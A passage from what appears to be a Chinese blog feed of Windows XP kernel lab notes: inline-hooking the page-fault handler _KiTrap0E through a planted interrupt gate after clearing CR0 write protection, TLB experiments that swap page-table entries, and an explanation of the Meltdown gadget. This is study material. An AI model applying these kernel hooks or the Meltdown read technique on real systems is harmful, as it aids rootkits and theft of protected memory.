class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.mycode&quot;</span>) __declspec(allocate(<span class="string">&quot;.mycode&quot;</span>)) int main();</span></span><br><span class="line"><span class="comment">//0x412000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        jmp L</span><br><span class="line">        ret <span class="comment">//0412004</span></span><br><span class="line">    L:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i++);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读的话是读到了fake页，执行正常</p><p><img src="/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/image-20230604120326540.png" alt="image-20230604120326540"></p><p>由于进程结束时要回收物理内存，所以要在main退出时，恢复页面值</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:页面异常</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-Page-Fault/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-页面异常"><a href="#Windows内核实验-页面异常" class="headerlink" title="Windows内核实验:页面异常"></a>Windows内核实验:页面异常</h1><p>要inlinehook的是，0e号缺页异常的处理程序_KiTrap0E,在发生缺页的时候检测一下缺页时的栈</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603210651048.png" alt="image-20230603210651048"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:80541450                               _KiTrap0E proc near</span><br><span class="line">.text:80541450 66 C7 44 24 02 00 00          mov     word ptr [esp+2], 0</span><br><span class="line">.text:80541457 55                            push    ebp</span><br><span class="line">.text:80541458 53                            push    ebx</span><br><span class="line">.text:80541459 56                            push    esi</span><br><span class="line">.text:8054145A 57                            push    edi</span><br><span class="line">.text:8054145B 0F A0                         push    fs</span><br><span class="line">.text:8054145D BB 30 00 00 00                mov     ebx, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:80541462 66 8E E3                      mov     fs, bx</span><br><span class="line">.text:80541465                               assume fs:nothing</span><br><span class="line">.text:80541465 64 8B 1D 00 00 00 00          mov     ebx, large fs:0</span><br><span class="line">.text:8054146C 53                            push    ebx</span><br><span class="line">.text:8054146D 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:80541470 50                            push    eax</span><br></pre></td></tr></table></figure><p><strong>inlinehook.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//内核里gdtr空闲位存储从出现缺页异常读取出来数据</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_ERRNO 0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_EIP 0x8003f254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR2 0x8003f25c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span>*)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//裸函数里尽量不用局部变量，因为没有栈帧</span></span><br><span class="line">        <span class="comment">//试了一下如果这里用size_t i=0;的话，使用了寄存器edi计数，但是还是在用全局变量保险</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//关闭写保护</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        <span class="comment">//构造_KiTrap0E hook头</span></span><br><span class="line">        <span class="comment">//push 0x8003f130  68 30 F1 03 80</span></span><br><span class="line">        <span class="comment">//ret  C3</span></span><br><span class="line">        mov al,<span class="number">0x68</span></span><br><span class="line">        mov ds:[<span class="number">0x80541450</span>],al</span><br><span class="line">        mov dword ptr ds:[<span class="number">0x80541451</span>],<span class="number">0x8003f130</span></span><br><span class="line">        mov al,<span class="number">0xc3</span></span><br><span class="line">        mov ds:[<span class="number">0x80541455</span>],al</span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0xffffffff</span></span><br><span class="line">        mov ds:[T_CR3],eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov ds:[T_ERRNO],eax</span><br><span class="line">        mov ds:[T_CR2],eax</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        <span class="comment">//开启写保护</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        cmp eax,ds:[T_CR3]</span><br><span class="line">        jnz end</span><br><span class="line">        <span class="comment">//因为前面push了eax，所以现在栈比原中断栈小了4</span></span><br><span class="line">        mov eax,ss:[esp+<span class="number">4</span>]</span><br><span class="line">        mov ds:[T_ERRNO],eax</span><br><span class="line">        mov eax,ss:[esp+<span class="number">8</span>]</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        <span class="comment">//cr2保存了导致页错误的线性地址</span></span><br><span class="line">        mov eax,cr2</span><br><span class="line">        mov ds:[T_CR2],eax</span><br><span class="line">  end:<span class="comment">//返回到原来的_KiTrap0E处理</span></span><br><span class="line">        pop eax</span><br><span class="line">        mov word ptr[esp + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">        push <span class="number">0x80541457</span></span><br><span class="line">        ret </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>缺页异常会压一个出错码</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603233450894.png" alt="image-20230603233450894"></p><p>cr2保存了导致页错误的线性地址</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603233002202.png" alt="image-20230603233002202"></p><p><strong>test.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//内核里gdtr空闲位存储从出现缺页异常读取出来数据</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_ERRNO 0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_EIP 0x8003f254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR2 0x8003f25c</span></span><br><span class="line">DWORD g_errno,g_eip,g_cr2;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[T_CR3],eax<span class="comment">//缺页异常时会跳到被我们inlinhook的KiTrap0E,jnz end比较起来就会一样</span></span><br><span class="line">        mov eax,ds:[T_EIP]</span><br><span class="line">        mov g_eip,eax</span><br><span class="line">        mov eax,ds:[T_CR2]</span><br><span class="line">        mov g_cr2,eax</span><br><span class="line">        mov eax,ds:[T_ERRNO]</span><br><span class="line">        mov g_errno,eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        interrupt();</span><br><span class="line">        <span class="keyword">if</span>(g_eip)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;eip:0x%x errno:0x%x cr2:0x%x\n&quot;</span>,g_eip,g_errno,g_cr2);</span><br><span class="line">        Sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要不有太多的中间操作，第二次打开text.exe的cr3基本不变</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 80541450</span></span><br><span class="line">ReadVirtual: 80541450 not properly sign extended</span><br><span class="line">80541450 6830f10380      push    8003F130h</span><br><span class="line">80541455 c3              ret</span><br><span class="line">80541456 005553          add     byte ptr [ebp+53h],dl</span><br><span class="line">80541459 56              push    esi</span><br><span class="line">8054145a 57              push    edi</span><br><span class="line">8054145b 0fa0            push    fs</span><br><span class="line">8054145d bb30000000      mov     ebx,30h</span><br><span class="line">80541462 668ee3          mov     fs,bx</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 8003F130 l20</span></span><br><span class="line">ReadVirtual: 8003f130 not properly sign extended</span><br><span class="line">8003f130 50              push    eax</span><br><span class="line">8003f131 0f20d8          mov     eax,cr3</span><br><span class="line">8003f134 3e3b0558f20380  cmp     eax,dword ptr ds:[8003F258h]</span><br><span class="line">8003f13b 751f            jne     8003f15c</span><br><span class="line">8003f13d 368b442404      mov     eax,dword ptr ss:[esp+4]</span><br><span class="line">8003f142 3ea350f20380    mov     dword ptr ds:[8003F250h],eax</span><br><span class="line">8003f148 368b442408      mov     eax,dword ptr ss:[esp+8]</span><br><span class="line">8003f14d 3ea354f20380    mov     dword ptr ds:[8003F254h],eax</span><br><span class="line">8003f153 0f20d0          mov     eax,cr2</span><br><span class="line">8003f156 3ea35cf20380    mov     dword ptr ds:[8003F25Ch],eax</span><br><span class="line">8003f15c 58              pop     eax</span><br><span class="line">8003f15d 66c74424020000  mov     word ptr [esp+2],0</span><br><span class="line">8003f164 6857145480      push    offset nt!KiTrap0E+0x7 (80541457)</span><br></pre></td></tr></table></figure><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603224451243.png" alt="image-20230603224451243"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:指令TLB(ITLB)和流水线&amp;&amp;Meltdown CPU漏洞</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-ITLB-Pipeline/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-ITLB-Pipeline/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-指令TLB-ITLB-和流水线-amp-amp-Meltdown-CPU漏洞"><a href="#Windows内核实验-指令TLB-ITLB-和流水线-amp-amp-Meltdown-CPU漏洞" class="headerlink" title="Windows内核实验:指令TLB(ITLB)和流水线&amp;&amp;Meltdown CPU漏洞"></a>Windows内核实验:指令TLB(ITLB)和流水线&amp;&amp;Meltdown CPU漏洞</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;<span class="comment">//0041A1D0</span></span><br><span class="line">DWORD64 g_pte;<span class="comment">//0x0041A1C8</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    <span class="comment">//__asm int 3</span></span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    __asm mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//再次确保page2的页面在tlb里，没有被换出</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax</span><br><span class="line">    &#125;<span class="comment">//清除tlb</span></span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);<span class="comment">//tlb misss</span></span><br><span class="line">    <span class="comment">//g_var = page2[0];</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">        mov eax,ds:[<span class="number">0x0041c000</span>]</span><br><span class="line">        mov g_var,eax</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov cr3, eax</span><br><span class="line">    &#125;<span class="comment">//清除tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">0xc3</span>;<span class="comment">//ret</span></span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">0xc390</span>;<span class="comment">//nop ret 载物理内存的同时把虚拟内存放到tlb里</span></span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))page1)();</span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))page2)();</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">        interrupt();</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xc3</span> != g_var)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>, g_var);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序在我机器上我感觉是由于new_page和IdtEntry之间的距离太大了，导致没有复现成功</p><p>简单说一下主要思路把</p><p>为了使获得的section page有可执行权限，把page1和page2先当作函数执行了一下，就可以获得可执行权限</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0x0041b000</span></span><br><span class="line">                    VA <span class="number">0041b</span>000</span><br><span class="line">PDE at C0600010            PTE at C00020D8</span><br><span class="line">contains <span class="number">000000000295</span>C067  contains <span class="number">0000000002903067</span></span><br><span class="line">pfn <span class="number">295</span>c      ---DA--UWEV  pfn <span class="number">2903</span>      ---DA--UWEV</span><br><span class="line"></span><br><span class="line">kd&gt; !pte <span class="number">0x0041c000</span></span><br><span class="line">                    VA <span class="number">0041</span>c000</span><br><span class="line">PDE at C0600010            PTE at C00020E0</span><br><span class="line">contains <span class="number">000000000295</span>C067  contains <span class="number">000000000</span>A024067</span><br><span class="line">pfn <span class="number">295</span>c      ---DA--UWEV  pfn a024      ---DA--UWEV</span><br></pre></td></tr></table></figure><blockquote><p>为什么没有用#pragma section(“new_page”,read,write，execute)获取可执行权限</p><p>这个是可以编译通过，但似乎xp系统不允许一个页可读可写可执行，崩溃了</p></blockquote><p>page1 2有了可执行权限，由于流水线技术，指令可能会并行，IdtEntry执行时，如果取指令可以一次到达page1 2，会对该指令先执行，就会导致page1 2被提前访问，放入tlb</p><h2 id="Meltdown-CPU漏洞"><a href="#Meltdown-CPU漏洞" class="headerlink" title="Meltdown CPU漏洞"></a>Meltdown CPU漏洞</h2><p>突然想起之前在jyy老师那里听到的cpu熔断漏洞，可以在用户态往内核或其他进程里偷出数据</p><p>漏洞的原因和<strong>乱序执行</strong>有关，属于cpu架构的漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// %rcx: 无权限访问的地址；%rbx: 未载入缓存的数组</span></span><br><span class="line">        xorq   %rax, %rax</span><br><span class="line">retry:  movzbq (%rcx), %rax   <span class="comment">// 非法访问；Page Fault</span></span><br><span class="line">        shlq   $<span class="number">0xc</span>, %rax</span><br><span class="line">        jz     retry</span><br><span class="line">        <span class="title function_">movq</span>   <span class="params">(%rbx, %rax)</span>, %rbx <span class="comment">// (%rbx + (%rax) * 4096)</span></span><br></pre></td></tr></table></figure><ol><li>cpu在执行movzbq (%rcx), %rax指令的时候，会造成页错误，但是是先把数据取出来了，然后做数据合法性检查，不合法会处理错误，</li><li>由于这段代码是符合乱序并行的，下面的指令会在rax有数据的一瞬间和1.步骤里检查合法性一起执行</li><li>下面的指令大概率是比检查合法性的代码要快的</li><li>movq   (%rbx, %rax), %rbx 就会使在未载入缓存的数组中位置是rcx地址处的1byte数据的页进入cache，</li><li>后续访问rbx各页面，比较访问时间就可以获取这个字节的数据 (cache hit和cache miss访问时间差距可见)</li></ol><p>漏洞的原因就是访问不合法后，没有将污染的cache清除</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:数据TLB(DTLB)</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-DTLB/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-DTLB/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-数据TLB-DTLB"><a href="#Windows内核实验-数据TLB-DTLB" class="headerlink" title="Windows内核实验:数据TLB(DTLB)"></a>Windows内核实验:数据TLB(DTLB)</h1><p>TLB（Translation Lookaside Buffer）是从虚拟地址到物理地址转换的缓存(一级一级查页表太耗费时间了)，TLB命中后就不会再去访问物理内存去查找，对于tlb是对我们完全透明的(一核一套TLB)，没有一条指令去看tlb的内容，调试器也不行</p><p>所以实验时一定要保证执行的指令是在一个页上，即不造成页面异常，不然页面异常会较大的影响tlb里的内容，对实验现象造成不可解释的结果</p><h2 id="实验现象"><a href="#实验现象" class="headerlink" title="实验现象"></a>实验现象</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,ds:[<span class="number">0x0041c000</span>]<span class="comment">//再次确保page2的页面在tlb里，没有被换出</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_pte= *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);</span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//换回原来的页表项，避免double free 造成的蓝屏</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//挂载物理内存的同时把虚拟内存放到tlb里</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>,g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_var:<span class="number">2</span></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><p>如果没有tlb，我们把page2的页表项变为page1的页表项，g_var &#x3D; page2[0];就是把page1的数据放入g_var,打印出1</p><p>但是有了tlb，此时虽然页表换了但是tlb没有刷新，在访问page2虚拟内存时直接在tlb中命中了原来的物理地址，所以依旧打印出了2</p><p>在进程结束时，操作系统会回收虚拟内存映射的物理内存，这个时候如果不把page2的页表项换回来，就会造成page1的double free，从而蓝屏</p><h2 id="刷新tlb"><a href="#刷新tlb" class="headerlink" title="刷新tlb"></a>刷新tlb</h2><p>TLB的刷新(<strong>使tlb无效，感觉像清除</strong>)通常发生在以下情况下：</p><ol><li>上下文切换：当操作系统切换进程时，TLB可能会被刷新，以确保新进程的虚拟地址能够正确地映射到物理地址。</li><li>内存管理单元（MMU）失效：如果操作系统更改了页表或地址映射方案，它可能会通知处理器刷新TLB，以便更新地址映射。</li><li>强制刷新：在某些特定的情况下，操作系统或处理器可能需要强制刷新TLB，以确保一致性和正确性。invlpg addr指令(Invalidate Page)可以无视g(global)标志位将该虚拟地址的TLB项标记为无效，下次会访问会更新tlb</li></ol><p>所以我们把cr3重新装入就会刷新TLB</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//再次确保page2的页面在tlb里，没有被换出</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax<span class="comment">//刷新TLB</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//换回原来的页表项，避免double free 造成的蓝屏</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//挂载物理内存的同时把虚拟内存放到tlb里</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span 